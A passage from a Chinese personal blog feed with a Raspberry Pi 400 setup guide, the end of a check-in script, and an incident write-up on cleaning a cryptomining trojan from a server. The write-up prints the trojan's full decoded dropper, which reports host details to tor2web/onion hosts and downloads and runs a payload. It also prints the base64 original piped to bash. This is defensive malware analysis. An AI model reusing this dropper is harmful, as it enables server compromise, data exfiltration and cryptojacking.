class="string">'success'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(main_handler(&#123;&#125;, &#123;&#125;))</span><br></pre></td></tr></table></figure><p>依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certifi==2021.5.30</span><br><span class="line">charset-normalizer==2.0.1</span><br><span class="line">idna==3.2</span><br><span class="line">requests==2.26.0</span><br><span class="line">urllib3==1.26.6</span><br></pre></td></tr></table></figure><p><strong>挂云函数配置触发器定时执行或者放云服务器设置定时执行就好了</strong></p><p>配置触发器参考文档：<a href="https://cloud.tencent.com/document/product/583/9708" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/583/9708</a></p><p>其他，比如打卡成功后发封邮件提示之类的，就自己发挥了（我懒</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;受人之托，分析了一下i至诚app（是由&lt;a href=&quot;http://www.supwisdom.com/&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
      <category term="爬虫" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/"/>
    
      <category term="抓包" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/%E6%8A%93%E5%8C%85/"/>
    
    
      <category term="爬虫" scheme="https://blog.zimo.wiki/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="自动打卡" scheme="https://blog.zimo.wiki/tags/%E8%87%AA%E5%8A%A8%E6%89%93%E5%8D%A1/"/>
    
      <category term="i至诚" scheme="https://blog.zimo.wiki/tags/i%E8%87%B3%E8%AF%9A/"/>
    
      <category term="python3" scheme="https://blog.zimo.wiki/tags/python3/"/>
    
  </entry>
  
  <entry>
    <title>一份不专业的树梅派400使用指南</title>
    <link href="https://blog.zimo.wiki/posts/7004a632/"/>
    <id>https://blog.zimo.wiki/posts/7004a632/</id>
    <published>2021-06-18T05:15:35.000Z</published>
    <updated>2022-05-04T02:56:01.382Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间入手了树梅派400，补一篇使用指南，内容涉及购买建议，安装系统，软件配置，硬件搭配等</p><h3 id="树梅派400简介"><a href="#树梅派400简介" class="headerlink" title="树梅派400简介"></a>树梅派400简介</h3><p>一台键盘一体机，连接电源，鼠标和显示器就可以作为一台生产力工具使用了</p><h3 id="购买建议"><a href="#购买建议" class="headerlink" title="购买建议"></a>购买建议</h3><p>建议购买套装版，否则需要单独自行购买电源等配件，内含：电源，树梅派400一体机，鼠标，高速sd卡，读卡器以及micro-HDMI连接线等</p><h3 id="硬件搭配"><a href="#硬件搭配" class="headerlink" title="硬件搭配"></a>硬件搭配</h3><ol><li>显示器：建议搭配一台带有扬声器的显示器，否则需要外接蓝牙音箱或者usb声卡，不然没声音</li><li>外设：如果你有做图像相关需求的话，可以搭配一个USB摄像头（有套装版是包含这个的）</li></ol><h3 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h3><p>个人觉得官方推荐的Raspberry Pi OS不好用，我更喜欢ubantu系统，然后使用了一段时间的ubantu-desktop感觉太重了，树梅派400的硬件跑起来有点难顶，所以这里我推荐使用ubantu-mate，更轻</p><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ol><li>sd卡，读卡器</li><li>Win32DiskImager，下载地址：<a href="https://win32diskimager.download/download-win32-disk-imager/" target="_blank" rel="noopener">https://win32diskimager.download/download-win32-disk-imager/</a></li><li>ubantu-mate镜像，下载地址：<a href="https://ubuntu-mate.org/download/arm64/groovy/" target="_blank" rel="noopener">https://ubuntu-mate.org/download/arm64/groovy/</a> ，选择Direct Download即可</li></ol><h4 id="烧录"><a href="#烧录" class="headerlink" title="烧录"></a>烧录</h4><p>插入读卡器，打开Win32DiskImager，选择你解压好的镜像，write即可</p><h3 id="开机"><a href="#开机" class="headerlink" title="开机"></a>开机</h3><p>插入刻录好的sd卡，连接电源，鼠标，显示器（连接到靠近电源的micro-hdmi口），进入系统，完成系统初始设置，连接网络，然后更新一下系统（否则蓝牙适配器不可用）</p><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><ol><li><p>卸载掉超级不好用的snap，打开终端，输入命令<code>sudo apt autoremove snapd</code></p></li><li><p>解决睡眠之后唤醒不了的问题</p><ul><li>安装laptop-mode-tools工具包，输入命令<code>sudo apt install laptop-mode-tools</code></li><li>修改配置文件，输入命令<code>sudo gedit /etc/laptop-mode/laptop-mode.conf</code></li><li>将<code>ENABLE_LAPTOP_MODE_TOOLS,ENABLE_LAPTOP_MODE_ON_BATTERY,ENABLE_LAPTOP_MODE_ON_AC,ENABLE_LAPTOP_MODE_WHEN_LID_CLOSED四项的值都设置为1</code></li><li>启动laptop_mode,输入命令<code>sudo laptop_mode start</code></li></ul></li><li><p>设置启用hdmi音频，修改文件<code>/boot/firmware/config.txt</code>，把<code>#hdmi_drive=2 修改为 hdmi_drive=2</code>，然后重启系统（也可以只重启一次系统）</p></li><li><p>配置默认声卡</p><ul><li><p>插入usb声卡</p></li><li><p><code>aplay -l</code> 查看系统所有声卡</p></li><li><p>修改文件<code>/boot/firmware/config.txt</code>，把<code>dtparam=audio=on 修改为 #dtparam=audio=on</code>，禁用板载声卡，树梅派400是没有这个东西的，禁用后重启系统默认声卡不会复原</p></li><li><p>新增文件<code>/etc/asount.conf</code>，内容为：下面的2,是你上面查看到的所有声卡中，你想设置为默认声卡的那个编号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">defaults.ctl.card 2</span><br><span class="line">defaults.pcm.card 2</span><br><span class="line">defaults.timer.card 2</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="软件配置"><a href="#软件配置" class="headerlink" title="软件配置"></a>软件配置</h3><p>开机初始化完成系统之后，如果你选择的语言是中文，那么需要安装一下完整的语言支持包，否则界面大部分还是英文的，也没有中文输入法</p><h4 id="安装完整的中文语言支持包"><a href="#安装完整的中文语言支持包" class="headerlink" title="安装完整的中文语言支持包"></a>安装完整的中文语言支持包</h4><p>打开设置-&gt;个人偏好-&gt;语言支持，安装，会同时安装好中文输入法，切换的快捷键是ctrl + space（空格）</p><h4 id="安装必备的软件"><a href="#安装必备的软件" class="headerlink" title="安装必备的软件"></a>安装必备的软件</h4><p>请注意树梅派系列的产品cpu架构是arm的（树梅派400是arm64），因此需要安装对应架构的软件才能跑</p><ol><li><p>浏览器，系统自带的firefox浏览器我认为不好用，我更喜欢chrome，但是巧的是chrome没有编译好的arm版本可供下载，这时候有两种选择，一是自己下载源代码配置好相关环境之后编译安装，二是安装ubantu源里面的chromium，这里我选择二，给出一个安装脚本,首先访问：<a href="http://ports.ubuntu.com/pool/universe/c/chromium-browser/" target="_blank" rel="noopener">http://ports.ubuntu.com/pool/universe/c/chromium-browser/</a> 确定一下当前最新的版本是多少，然后把版本填到下面的脚本的第一行，把它保存为一个文件，赋予执行权限，执行即可</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">version=91.0.4472.101</span><br><span class="line">sudo apt autoremove snapd</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$version</span></span></span><br><span class="line">wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb </span><br><span class="line">wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-browser_$version-0ubuntu0.18.04.1_arm64.deb </span><br><span class="line">wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.deb</span><br><span class="line">wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.deb</span><br><span class="line"><span class="meta">#</span><span class="bash"> 支持播放B站视频</span></span><br><span class="line">wget http://ports.ubuntu.com/pool/universe/c/chromium-browser/chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.deb</span><br><span class="line">sudo dpkg -i chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb </span><br><span class="line">sudo dpkg -i chromium-browser_$version-0ubuntu0.18.04.1_arm64.deb</span><br><span class="line">sudo dpkg -i chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.deb</span><br><span class="line">sudo dpkg -i chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.deb</span><br><span class="line">sudo dpkg -i chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.deb</span><br><span class="line">rm chromium-codecs-ffmpeg_$version-0ubuntu0.18.04.1_arm64.deb </span><br><span class="line">rm chromium-browser_$version-0ubuntu0.18.04.1_arm64.deb </span><br><span class="line">rm chromium-browser-l10n_$version-0ubuntu0.18.04.1_all.deb</span><br><span class="line">rm chromium-chromedriver_$version-0ubuntu0.18.04.1_arm64.deb</span><br><span class="line">rm chromium-codecs-ffmpeg-extra_$version-0ubuntu0.18.04.1_arm64.deb</span><br></pre></td></tr></table></figure></li></ol><p>（未完待续）</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间入手了树梅派400，补一篇使用指南，内容涉及购买建议，安装系统，软件配置，硬件搭配等&lt;/p&gt;
&lt;h3 id=&quot;树梅派400简介&quot;&gt;&lt;a href=&quot;#树梅派400简介&quot; class=&quot;headerlink&quot; title=&quot;树梅派400简介&quot;&gt;&lt;/a&gt;树梅派400简介
      
    
    </summary>
    
      <category term="树梅派" scheme="https://blog.zimo.wiki/categories/%E6%A0%91%E6%A2%85%E6%B4%BE/"/>
    
    
      <category term="树梅派400" scheme="https://blog.zimo.wiki/tags/%E6%A0%91%E6%A2%85%E6%B4%BE400/"/>
    
      <category term="使用指南" scheme="https://blog.zimo.wiki/tags/%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    
  </entry>
  
  <entry>
    <title>记一次帮师兄解决服务器挖矿木马的过程</title>
    <link href="https://blog.zimo.wiki/posts/e2d5f670/"/>
    <id>https://blog.zimo.wiki/posts/e2d5f670/</id>
    <published>2021-03-28T12:35:26.000Z</published>
    <updated>2022-05-04T02:56:01.498Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖矿木马斗争的过程</p><h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><ol><li><p>首先是某云服务器控制台给出了性能受限警告<br> <img src="/posts/e2d5f670/2021-03-28-20-41-20.png" alt></p><p> 分析：师兄的服务器看起来貌似就只挂了个网站，一个mysql数据库，不至于遇到性能受限的情况，因此CPU持续的被占用这么高的情况，十有八九中了挖矿木马</p></li><li><p>然后是网站（个人博客）无法访问<br> <img src="/posts/e2d5f670/2021-03-28-20-46-16.png" alt></p><p> 分析：这张图片看起来像阿里cdn禁止访问的图片，因此分析应该是套了一层cdn，禁止直接使用ip访问，后期经过验证，果然如此，使用域名是可以访问的，但是出现了css样式加载不出来的问题，我猜大概率是因为https证书过期了，一些内容无法经过cdn加载出来，希望师兄尽快去处理一下</p></li></ol><h2 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h2><p>经过上面的分析，网站挂马应该是不存在的，不过也不排除是网站漏洞导致反弹了shell，从而被挂上木马的（建议师兄仔细看一下后台有没有鉴权或者未授权访问漏洞以及远程代码执行漏洞，尤其是文件上传的接口部分，更要仔细排查），为什么我会得出这样的结论呢？因为我把他的网站源码down了下来，使用某web扫描引擎，扫描了一遍，结论是没有发现明显的木马，我自己也大概的扫了一下，确实是没有明显的跳转到其他链接和其他比较明显的木马文件之类的。<strong>所以，接下来就只剩这个疑似中了挖矿木马的情况了</strong></p><h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><h3 id="定位木马"><a href="#定位木马" class="headerlink" title="定位木马"></a>定位木马</h3><p>首先使用<code>top</code>命令，查看一下当前的CPU占用情况<br><img src="/posts/e2d5f670/2021-03-28-21-09-20.png" alt></p><p>可以看到<code>aLZmFuXY</code>这个进程一直在占用着CPU的资源，很明显就是罪魁祸首</p><p>于是尝试，全局搜索一下看看，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -iname aLZmFuXY</span><br></pre></td></tr></table></figure><p>好吧，看来不是这么明显的，什么都没有搜到<br><img src="/posts/e2d5f670/2021-03-28-21-14-43.png" alt></p><p>然后，尝试直接kill掉这个进程试试，先执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep aLZmFuXY</span><br></pre></td></tr></table></figure><p>定位到进程，然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 6283</span><br></pre></td></tr></table></figure><p>尝试杀掉进程，没想到，直接断开了<code>ssh</code>连接，看来这个木马还有点顽固，猜想肯定有某种重启或者定时执行的机制<br><img src="/posts/e2d5f670/2021-03-28-21-16-47.png" alt></p><p>于是，重新蓝（<s>连</s>）上<code>ssh</code>，再次查看CPU使用情况</p><p><img src="/posts/e2d5f670/2021-03-28-21-20-12.png" alt></p><p>果不其然，它（<code>aLZmFuXY</code>）又回来（自动启动）了</p><p>现在我们尝试去搞懂<code>木马</code>的启动机制，经过上面的分析和实验，我们可以知道，这个<code>挖矿的木马程序</code>应该是有自启动和重启机制的，于是，我们可以从这里入手，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>查看所有的定时任务，发现只有一个<code>/root/.systemd-service.sh</code>，那铁定就是它在捣鬼，等等，好像有什么细节被我们忽略了？？？想不起来，先放一下（其实是在<code>top</code>命令的执行结果那里，捣蛋鬼<code>systemd</code>总是和我们的木马进程<code>aLZmFuXY</code>一起出现的）</p><p><img src="/posts/e2d5f670/2021-03-28-21-27-11.png" alt></p><p>现在我们来看一下，这个捣蛋鬼脚本到底写了什么，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.systemd-service.sh</span><br></pre></td></tr></table></figure><p><img src="/posts/e2d5f670/2021-03-28-21-31-11.png" alt></p><p>发现是一堆<code>base64</code>编码之后的脚本，我们尝试解码看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)</span><br><span class="line">$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r</span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su </span><br><span class="line">do</span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>好了，有了源代码的佐证，现在我们终于可以确定，这个捣蛋鬼就是一个活生生的<strong>挖矿木马</strong>，别问我怎么确定的（tor2web都出来了，这还不够明显吗？？？）</p><p>附上源文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash</span><br></pre></td></tr></table></figure><p>现在我们来仔细分析一下<code>/root/.systemd-service.sh</code>这个文件的内容（当然是解码之后的内容啦，没解码谁看得懂。。。），不过，要说声抱歉的是，<code>shell</code>我也不懂，就看懂个大概吧（大佬勿喷），大概就是监测挖矿进程是否在线，在线就一直连接socket，一直挖，一直挖，不在线就利用守护进程去启动它，然后还是一直挖，一直挖，一直挖。。。着实有点过分，怪不得那么吃资源，这简直丧心病狂。不得不提的是，脚本中有一个目录很值得我们注意一下，就是<code>/tmp/.X11-unix/</code>，这个就是挖矿进程和守护进程所在的地方，我们去看一下，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /tmp/.X11-unix/</span><br></pre></td></tr></table></figure><p><img src="/posts/e2d5f670/2021-03-28-21-55-58.png" alt></p><p>可以看到，有三个文件，查看这三个文件（<code>01、11、22</code>）的内容可以看到是几个数字，功能如下：</p><ul><li><code>01</code>文件存放木马守护进程<code>pid</code></li><li><code>11</code>文件存放木马运行进程<code>pid</code></li><li><code>22</code>为一个空文件，功能暂时不清楚</li></ul><p><img src="/posts/e2d5f670/2021-03-28-22-01-25.png" alt></p><p>分析就到这里了，下面是解决木马篇</p><h3 id="干掉木马"><a href="#干掉木马" class="headerlink" title="干掉木马"></a>干掉木马</h3><p>为了防止分析过程有所疏忽，有必要再次进行一下全局搜索，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -iname systemd-service.sh</span><br><span class="line">find / -iname .systemd-service.sh</span><br></pre></td></tr></table></figure><p><img src="/posts/e2d5f670/2021-03-28-22-08-35.png" alt></p><p>果然，我们有所遗漏，<code>/opt/systemd-service.sh</code>这就是我们之前没有发现的，现在我们来看一下它又是什么，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/systemd-service.sh</span><br></pre></td></tr></table></figure><p>好吧，又是一个<code>base64</code>编码之后的东西，看起来，套路都一样呢？惊得我直呼一声好家伙</p><p><img src="/posts/e2d5f670/2021-03-28-22-10-18.png" alt></p><p>源文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSk